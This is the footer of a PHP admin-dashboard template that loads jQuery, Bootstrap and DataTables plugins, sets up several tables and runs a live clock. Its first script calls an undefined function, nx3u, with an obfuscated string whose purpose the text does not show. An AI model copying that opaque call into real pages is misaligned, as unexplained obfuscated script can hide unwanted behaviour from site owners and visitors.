
		<script type="text/javascript">
			nx3u("=-dmuldsvi!em=fgE<mCpbdr!");
		</script>
		<!-- Back-to-top -->
		<a href="#top" id="back-to-top"><i class="las la-angle-double-up"></i></a>
		<!-- JQuery min js -->
		<script src="<?php echo base_url();?>assets/plugins/jquery/jquery.min.js"></script>
		<!-- custom js -->

		<script src="<?php echo base_url();?>assets/js/modal.js"></script>
		<!-- Bootstrap js -->
		<script src="<?php echo base_url();?>assets/plugins/bootstrap/js/popper.min.js"></script>
		<script src="<?php echo base_url();?>assets/plugins/bootstrap/js/bootstrap.js"></script>
		<script src="<?php echo base_url();?>assets/js/sweetalert2.js"></script>

		<!-- Ionicons js -->
		<script src="<?php echo base_url();?>assets/plugins/ionicons/ionicons.js"></script>
		<!-- Moment js -->
		<script src="<?php echo base_url();?>assets/plugins/moment/moment.js"></script>
		<!-- P-scroll js -->
		<script src="<?php echo base_url();?>assets/plugins/perfect-scrollbar/perfect-scrollbar.min.js"></script>
		<script src="<?php echo base_url();?>assets/plugins/perfect-scrollbar/p-scroll.js"></script>
		<!-- Sticky js -->
		<script src="<?php echo base_url();?>assets/js/sticky.js"></script>
		<!-- eva-icons js -->
		<script src="<?php echo base_url();?>assets/js/eva-icons.min.js"></script>
		<!-- Rating js-->
		<script src="<?php echo base_url();?>assets/plugins/rating/jquery.rating-stars.js"></script>
		<script src="<?php echo base_url();?>assets/plugins/rating/jquery.barrating.js"></script>
		<!-- Sidebar js -->
		<script src="<?php echo base_url();?>assets/plugins/side-menu/sidemenu.js"></script>
		<!-- Right-sidebar js -->
		<script src="<?php echo base_url();?>assets/plugins/sidebar/sidebar.js"></script>
		<script src="<?php echo base_url();?>assets/plugins/sidebar/sidebar-custom.js"></script>
		<!-- Internal Data tables -->
		<script src="<?php echo base_url();?>assets/plugins/datatable/js/jquery.dataTables.min.js"></script>
		<script src="<?php echo base_url();?>assets/plugins/datatable/js/dataTables.dataTables.min.js"></script>
		<script src="<?php echo base_url();?>assets/plugins/datatable/js/dataTables.responsive.min.js"></script>
		<script src="<?php echo base_url();?>assets/plugins/datatable/js/responsive.dataTables.min.js"></script>
		<script src="<?php echo base_url();?>assets/plugins/datatable/js/jquery.dataTables.js"></script>
		<script src="<?php echo base_url();?>assets/plugins/datatable/js/dataTables.bootstrap4.js"></script>
		<script src="<?php echo base_url();?>assets/plugins/datatable/js/dataTables.buttons.min.js"></script>
		<script src="<?php echo base_url();?>assets/plugins/datatable/js/buttons.bootstrap4.min.js"></script>
		<script src="<?php echo base_url();?>assets/plugins/datatable/js/jszip.min.js"></script>
		<script src="<?php echo base_url();?>assets/plugins/datatable/js/pdfmake.min.js"></script>
		<script src="<?php echo base_url();?>assets/plugins/datatable/js/vfs_fonts.js"></script>
		<script src="<?php echo base_url();?>assets/plugins/datatable/js/buttons.html5.min.js"></script>
		<script src="<?php echo base_url();?>assets/plugins/datatable/js/buttons.print.min.js"></script>
		<script src="<?php echo base_url();?>assets/plugins/datatable/js/buttons.colVis.min.js"></script>
		<script src="<?php echo base_url();?>assets/plugins/datatable/js/dataTables.responsive.min.js"></script>
		<script src="<?php echo base_url();?>assets/plugins/datatable/js/responsive.bootstrap4.min.js"></script>
		<!--Internal  Datatable js -->

		<script src="<?php echo base_url();?>assets/js/table-data.js"></script>
		<!-- Horizontalmenu js-->
		<script src="<?php echo base_url();?>assets/plugins/horizontal-menu/horizontal-menu-2/horizontal-menu.js"></script>
		<!-- Internal Select2 js-->
		<script src="<?php echo base_url();?>assets/plugins/select2/js/select2.min.js"></script>
		<script src="<?php echo base_url();?>assets/js/custom.js"></script>
		<!-- Switcher js -->
		<script src="<?php echo base_url();?>assets/switcher/js/switcher.js"></script>
		<!--Internal  Sweet-Alert js-->

		<script>
			   $('#pend').DataTable();
			   $('#app').DataTable();
			   $('#can').DataTable();
			   $('#log').DataTable();
		 </script>

		<script>
		function showTime() {
			var date = new Date();
			
			// Date formatting
			var monthNames = ["January", "February", "March", "April", "May", "June",
							"July", "August", "September", "October", "November", "December"];
			var day = date.getDate();
			var month = monthNames[date.getMonth()];
			var year = date.getFullYear();
			
			// Time formatting
			var h = date.getHours();
			var m = date.getMinutes();
			var s = date.getSeconds();
			var session = "AM";
			
			if (h == 0) {
				h = 12;
			}
			if (h > 12) {
				h = h - 12;
				session = "PM";
			}
			if (h < 10) {
				h = "0" + h;
			}
			if (m < 10) {
				m = "0" + m;
			}
			if (s < 10) {
				s = "0" + s;
			}
			
			var time = month + " " + day + ", " + year + " at " + h + ":" + m + ":" + s + " " + session;
			
			document.getElementById("MyClockDisplay").innerText = time;
			document.getElementById("MyClockDisplay").textContent = time;
			
			setTimeout(showTime, 1000);
		}
		showTime();
		</script>


	</body>
</html>
